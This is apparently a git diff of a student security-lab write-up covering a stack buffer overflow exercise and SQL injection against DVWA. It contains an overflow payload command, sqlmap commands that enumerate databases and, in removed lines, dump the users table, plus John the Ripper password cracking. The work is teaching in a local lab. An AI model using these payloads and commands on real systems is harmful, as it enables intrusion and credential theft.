@@ -80,8 +80,8 @@ _start:
 ```bash
 nano redundant_code.c
 ```
-![image](![image](https://github.com/user-attachments/assets/0d94ee81-f71f-4dc8-a03d-883b2a0b054c)
-)
+![image](https://github.com/user-attachments/assets/0d94ee81-f71f-4dc8-a03d-883b2a0b054c)
+
 
 Create a C program that contains a buffer overflow vulnerability
 
@@ -90,6 +90,8 @@ Create a C program that contains a buffer overflow vulnerability
 ```bash
 gcc -o redundant_code redundant_code.c -fno-stack-protector -z execstack
 ```
+![image](https://github.com/user-attachments/assets/4c9ded45-326f-4199-91ff-d169428f5b97)
+
 Run by gcc
 - -fno-stack-protector: Disables stack protection.
 - -z execstack: Marks the stack as executabl
@@ -101,7 +103,7 @@ Run by gcc
 ```bash
 nano asm_code.asm
 ```
-![image](https://github.com/user-attachments/assets/d431ef63-ede5-4b1c-ad05-3e1ba676f77f)
+![image](https://github.com/user-attachments/assets/7efe0060-afab-4438-97b4-140d2497bb32)
 
 ## 4. Compile the Assembly Code 
 
@@ -111,6 +113,7 @@ nano asm_code.asm
 nasm -f elf32 -o asm_code.o asm_code.asm
 ld -m elf_i386 -o asm_code asm_code.o
 ```
+![image](https://github.com/user-attachments/assets/d9e73715-0fd3-4efb-9992-71930bda3b1c)
 
 ## 5. Load redundant_code  to gdb
 
@@ -126,20 +129,24 @@ break redundant_code
 run $(python -c "print('A'*72)")
 p &buffer
 ```
+![image](https://github.com/user-attachments/assets/36f0874d-2122-46a6-8730-2c01e085cdef)
 
-![image](https://github.com/user-attachments/assets/1c2622c2-8880-49e1-8d64-32e16e20a848)
+![image](https://github.com/user-attachments/assets/cfb563e9-a78f-476c-b633-ef624a9935c2)
+
+![image](https://github.com/user-attachments/assets/f53071fa-d402-4fc9-a824-a2de2da75055)
+
 
 
 Inside `gdb`, set a breakpoint in the `redundant_code`, run the program with a dummy argument, and find the address of your payload. This will typically be after the buffer size.
 
-Make a note of the address is `0xf7fcc5b4`; you'll use it in the next step.
+Make a note of the address is `0x7ffff7fb9278`; you'll use it in the next step.
 
 ## 7. Execute the Vulnerable Program with the Payload
 
 Run the vulnerable program with the crafted payload:
 
 ```bash
-./redundant_code "$(python -c "print('a'*72 + '\xb4\xc5\xfc\xf7')")"
+./redundant_code "$(python3 -c "print('a'*72 + '\x78\x92\xfb\xf7\xff\x7f')")"
 ```
 
 Generated a string of 72 'a' characters followed by a byte sequence intended to manipulate the program's execution flow. The output resulted in a "Segmentation fault (core dumped)," confirming the presence of a buffer overflow vulnerability in the redundant_code program.
@@ -147,20 +154,12 @@ Generated a string of 72 'a' characters followed by a byte sequence intended to 
 ## 8. Verify the Output
 
 ```bash
-cat /etc/passwd
-```
-
-![image](https://github.com/user-attachments/assets/ef6984a4-6a33-45d3-80b7-aae79745d59f)
-
-
-The command cat /etc/passwd is useful for viewing user account information on a Linux or Unix system.  
-
-```bash
 cat /tmp/outfile
 ```
 
+![image](https://github.com/user-attachments/assets/158a608a-2eae-4942-bf73-d128b2a41a0b)
 
-![image](https://github.com/user-attachments/assets/56fa25ea-0a95-44ba-a009-1a78bd406e6a)
+
 
  The /etc/passwd file is copied to /tmp/outfile.
 
@@ -183,26 +182,29 @@ Set up the eviroment
 
 ```bash
 docker pull vulnerables/web-dvwa
-docker run -d -p 80:80 vulnerables/web-dvwa
+docker run -d -p 8080:80 vulnerables/web-dvwa
 ```
-![image](https://github.com/user-attachments/assets/54f77e65-1050-4959-aac1-4685fc0c55b7)
+run the dvwa container at port 8080
 
+![image](https://github.com/user-attachments/assets/5469c568-99b6-4252-b39f-560d936eaf2b)
 
 
 2. Access DVWA
 
-Open a web browser and go to: http://localhost
+Open a web browser and go to: http://localhost:8080
 Log in with the default credentials:
 
 Username: admin
 
 Password: password
 
-![image](https://github.com/user-attachments/assets/621fccaa-4c6a-4af0-80c0-679b52944d1b)
+![image](https://github.com/user-attachments/assets/7222f74d-1bce-4afe-8a89-d910eb919dd7)
+
 
 This is page Login to DVWA
 
-![image](https://github.com/user-attachments/assets/0a765301-2d1b-44b7-a8ef-5b020f4ce2d9)
+![image](https://github.com/user-attachments/assets/43271ead-00d7-44a4-8a6f-6de199cd4566)
+
 
 This home page to set up database
 
@@ -215,105 +217,31 @@ sudo apt install sqlmap
 
 4. Fetch the url of webiste you want to attack
 
-![image](https://github.com/user-attachments/assets/7990b9c9-d27f-4129-be3f-03c756477149)
+![image](https://github.com/user-attachments/assets/933ada14-04f2-4006-a3cd-c6d502a63515)
+
+Change the DVWA security to Medium (default: Low)
+![image](https://github.com/user-attachments/assets/5b7fd915-141b-4c37-8188-6721a09b9cc5)
 
 
-Enter any value for this to retun a url : `http://localhost/vulnerabilities/sqli/?id=1`
+Enter any value for this to retun a url : `http://localhost/vulnerabilities/sqli/?id=2`
 
 5. Get information about all available databases
 
 
-![image](https://github.com/user-attachments/assets/50a4a548-b017-4cf1-9a9c-c3cde8af9d2d)
+![image](https://github.com/user-attachments/assets/6fe65cb0-f62d-4a0e-8b42-89f65bf88927)
 
-Get cookie value of website: PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3
 
-- -u: This option specifies the target URL that sqlmap will test for SQL injection vulnerabilities.
+Get cookie value of website: PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770
 
-- --cookie: This option allows you to provide specific cookies that should be sent along with the request. 
-
-- --data: This option is used to send data in a POST request.
-- --dbs:This option tells sqlmap to enumerate the databases on the server if an SQL injection vulnerability is detected. It attempts to retrieve a list of all databases present in the database management system.
 
 ```bash
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --dbs
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770; security=low " --data="id=1&Submit=Submit" --dbs
 ```
 
-![image](https://github.com/user-attachments/assets/0a9fd479-4d89-43ba-9f3a-56db673d3400)
+![image](https://github.com/user-attachments/assets/fed822f7-00be-4b8d-8176-ec7a79265298)
+
 
 Return 2 available databases named : dvwa and information_schema
 
 
-**Question 2**: Use sqlmap to get tables, users information
-**Answer 2**:
-
-## 1. Choice Database is dvwa and Use sqlmap to get table 
-
--D: This option specifies the database name that sqlmap should target.
---tables:
-This option tells sqlmap to enumerate the tables within the specified database (in this case, dvwa). If the dvwa database is found and accessible, sqlmap will retrieve and display a list of its tables.
-
-
-```bash
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa --tables
-```
-
-
-
-![image](https://github.com/user-attachments/assets/13a09125-e859-4705-8e9c-50f30622f3be)
-
-Return 2 tables named : guestbook and users
-
-## 2. Choice Database is Users and  use sqlmap to get  users information
-
-
--T: Specifies the target table to operate on.
---dump:
-This option tells sqlmap to extract and display the contents of the specified table (users). It retrieves all rows and columns from the users table
-
-```bash
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump
-```
-
-![image](https://github.com/user-attachments/assets/70f0eef2-adaa-4242-b3d2-279322f1da2b)
-
-
-Retrun all columns and all row of table named users
-
-
-**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
-**Answer 3**:
-
-## 1. Dowload John the Ripper
-
-
-```bash
-sudo apt-get install john
-```
-![image](https://github.com/user-attachments/assets/65108fed-599b-41b1-8439-885bfa231c6d)
-
-or on windown download from `https://download.openwall.net/pub/projects/john/contrib/windows/` 
-
-
-Download successfully
-
-## 2. Make format to use John the Ripper 
-
-![image](https://github.com/user-attachments/assets/96d9bbab-0846-497c-9ff4-fd688a34939b)
-
-
-## 3. You can see the password has been hashed next to it
-
---format: Specifies the type of hashing algorithm used. John the Ripper supports various formats, including raw-md5, sha256, bcrypt, and more. Specifying the correct format is essential for accurate cracking.
-
-```hash
-.\john.exe --format=raw-md5 C:\Users\ASUS\Downloads\hash.txt
-```
-
-![image](https://github.com/user-attachments/assets/6f691a82-63d9-4f8d-8290-272dab4fbb2f)
-
-
-
-
-
-`Conclusion`: In this exercise, I demonstrated the process of exploiting SQL injection vulnerabilities in DVWA using SQLMap to gather database information, including tables and user details. Following this, I utilized John the Ripper to crack the database users' passwords. This practical approach emphasizes the need for secure coding, proper database configuration, and the importance of securing web applications against SQL injection attacks to protect sensitive information from being compromised.
 
